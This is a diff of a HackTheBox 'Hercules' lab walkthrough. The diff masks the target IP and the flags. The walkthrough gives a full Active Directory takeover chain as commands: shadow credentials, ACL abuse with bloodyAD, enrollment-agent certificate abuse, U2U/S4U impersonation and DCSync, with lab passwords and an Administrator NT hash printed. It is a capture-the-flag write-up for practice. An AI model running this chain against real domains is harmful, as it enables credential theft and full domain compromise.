@@ -2,7 +2,7 @@
 
 > SEO: HackTheBox Hercules writeup, HackTheBox Hercules walkthrough, HTB Hercules solution, hercules.htb Active Directory exploit chain.
 
-> **Target IP used in this run:** `10.129.11.138`  
+> **Target IP used in this run:** `<TARGET_IP>`  
 > **Domain:** `hercules.htb`  
 > **DC Hostname:** `dc.hercules.htb`
 
@@ -19,14 +19,14 @@ Hercules is a deep Windows AD chain:
 5. Service-account chain + U2U/S4U trick
 6. DCSync and final Administrator access
 
-This writeup reflects a **working run** against `10.129.11.138`, including timing constraints from the periodic reset/cleanup behavior.
+This writeup reflects a **working run** against `<TARGET_IP>`, including timing constraints from the periodic reset/cleanup behavior.
 
 ---
 
 ## 2) Initial setup
 
 ```bash
-echo "10.129.11.138 dc.hercules.htb hercules.htb" | sudo tee -a /etc/hosts
+echo "<TARGET_IP> dc.hercules.htb hercules.htb" | sudo tee -a /etc/hosts
 ```
 
 Recommended Kerberos config for this target:
@@ -74,7 +74,7 @@ Via the web-admin/document workflow chain (cookie + Bad-ODF + NetNTLMv2 capture/
 Then:
 
 ```bash
-getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip 10.129.11.138
+getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip <TARGET_IP>
 ```
 
 ---
@@ -84,7 +84,7 @@ getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip 10.129.11.138
 ```bash
 export KRB5CCNAME=$(pwd)/natalie.a.ccache
 certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
-  -dc-ip 10.129.11.138 -target dc.hercules.htb -dc-host dc.hercules.htb \
+  -dc-ip <TARGET_IP> -target dc.hercules.htb -dc-host dc.hercules.htb \
   -account bob.w
 ```
 
@@ -108,7 +108,7 @@ Then shadow `auditor` from `natalie.a`:
 ```bash
 export KRB5CCNAME=$(pwd)/natalie.a.ccache
 certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
-  -dc-ip 10.129.11.138 -target dc.hercules.htb -dc-host dc.hercules.htb \
+  -dc-ip <TARGET_IP> -target dc.hercules.htb -dc-host dc.hercules.htb \
   -account auditor
 ```
 
@@ -131,7 +131,7 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
 
 **user.txt:**
 
-`30a01498710660e569b0d5633bd83bb6`
+`30a01498710660e5████████████████`
 
 ---
 
@@ -141,7 +141,7 @@ Grant control repeatedly (reset task may revert):
 
 ```bash
 export KRB5CCNAME=$(pwd)/auditor.ccache
-bloodyAD --host dc.hercules.htb -d hercules.htb -k -i 10.129.11.138 \
+bloodyAD --host dc.hercules.htb -d hercules.htb -k -i <TARGET_IP> \
   add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
 ```
 
@@ -160,12 +160,12 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
 ### 9.1 Enrollment Agent cert
 
 ```bash
-getTGT.py 'HERCULES.HTB/fernando.r:NewPass123!' -dc-ip 10.129.11.138
+getTGT.py 'HERCULES.HTB/fernando.r:NewPass123!' -dc-ip <TARGET_IP>
 export KRB5CCNAME=$(pwd)/fernando.r.ccache
 
 certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
-  -target dc.hercules.htb -target-ip 10.129.11.138 \
-  -dc-host dc.hercules.htb -dc-ip 10.129.11.138 \
+  -target dc.hercules.htb -target-ip <TARGET_IP> \
+  -dc-host dc.hercules.htb -dc-ip <TARGET_IP> \
   -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom -out fernando_ea2
 ```
 
@@ -173,8 +173,8 @@ certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
 
 ```bash
 certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
-  -target dc.hercules.htb -target-ip 10.129.11.138 \
-  -dc-host dc.hercules.htb -dc-ip 10.129.11.138 \
+  -target dc.hercules.htb -target-ip <TARGET_IP> \
+  -dc-host dc.hercules.htb -dc-ip <TARGET_IP> \
   -ca 'CA-HERCULES' -template 'UserSignature' \
   -on-behalf-of 'hercules\ASHLEY.B' -pfx fernando_ea2.pfx -dcom
 ```
@@ -185,7 +185,7 @@ This produced `ashley.b.pfx` successfully (the major blocker in many runs if usi
 
 ```bash
 rm -f ashley.b.ccache
-certipy auth -pfx ashley.b.pfx -dc-ip 10.129.11.138 -no-hash
+certipy auth -pfx ashley.b.pfx -dc-ip <TARGET_IP> -no-hash
 ```
 
 ---
@@ -209,7 +209,7 @@ Once the window hit:
 Then:
 
 ```bash
-getTGT.py 'HERCULES.HTB/IIS_Administrator:Passw0rd@123' -dc-ip 10.129.11.138
+getTGT.py 'HERCULES.HTB/IIS_Administrator:Passw0rd@123' -dc-ip <TARGET_IP>
 ```
 
 ---
@@ -220,7 +220,7 @@ Reset service-account password from `IIS_Administrator` context:
 
 ```bash
 export KRB5CCNAME=$(pwd)/IIS_Administrator.ccache
-bloodyAD --host dc.hercules.htb -d hercules.htb -k -i 10.129.11.138 \
+bloodyAD --host dc.hercules.htb -d hercules.htb -k -i <TARGET_IP> \
   set password 'IIS_Webserver$' 'Passw0rd@123'
 ```
 
@@ -229,7 +229,7 @@ Get TGT with RC4 hash-based auth:
 ```bash
 # NT hash of Passw0rd@123
 # 14d0fcda7ad363097760391f302da68d
-getTGT.py 'HERCULES.HTB/IIS_Webserver$' -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip 10.129.11.138
+getTGT.py 'HERCULES.HTB/IIS_Webserver$' -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip <TARGET_IP>
 ```
 
 Extract TGT session key from `IIS_Webserver$.ccache` (type 23 expected), then set account NT hash to that session key:
@@ -238,7 +238,7 @@ Extract TGT session key from `IIS_Webserver$.ccache` (type 23 expected), then se
 export KRB5CCNAME=$(pwd)/IIS_Webserver$.ccache
 changepasswd.py -newhashes ':<SESSION_KEY_HEX>' \
   'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
-  -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip 10.129.11.138 -k
+  -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip <TARGET_IP> -k
 ```
 
 Now request impersonation ticket:
@@ -246,7 +246,7 @@ Now request impersonation ticket:
 ```bash
 export KRB5CCNAME=$(pwd)/IIS_Webserver$.ccache
 getST.py -spn 'cifs/dc.hercules.htb' -impersonate Administrator \
-  -dc-ip 10.129.11.138 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
+  -dc-ip <TARGET_IP> 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
 ```
 
 Output:
@@ -259,7 +259,7 @@ Output:
 
 ```bash
 export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
-secretsdump.py -k -no-pass dc.hercules.htb -dc-ip 10.129.11.138 -just-dc-user administrator
+secretsdump.py -k -no-pass dc.hercules.htb -dc-ip <TARGET_IP> -just-dc-user administrator
 ```
 
 Recovered Administrator NT hash:
@@ -269,7 +269,7 @@ Recovered Administrator NT hash:
 Then:
 
 ```bash
-getTGT.py 'HERCULES.HTB/Administrator' -hashes ':56855ee6b7570edefde6ac262200756e' -dc-ip 10.129.11.138
+getTGT.py 'HERCULES.HTB/Administrator' -hashes ':56855ee6b7570edefde6ac262200756e' -dc-ip <TARGET_IP>
 ```
 
 ---
@@ -285,7 +285,7 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
 
 **root.txt:**
 
-`4bb7856e2706b71950c9f2d710a517fe`
+`4bb7856e2706b719████████████████`
 
 ---
 
@@ -299,5 +299,5 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
 
 ## Final Flags (this run)
 
-- `user.txt`: `30a01498710660e569b0d5633bd83bb6`
-- `root.txt`: `4bb7856e2706b71950c9f2d710a517fe`
+- `user.txt`: `30a01498710660e5████████████████`
+- `root.txt`: `4bb7856e2706b719████████████████`
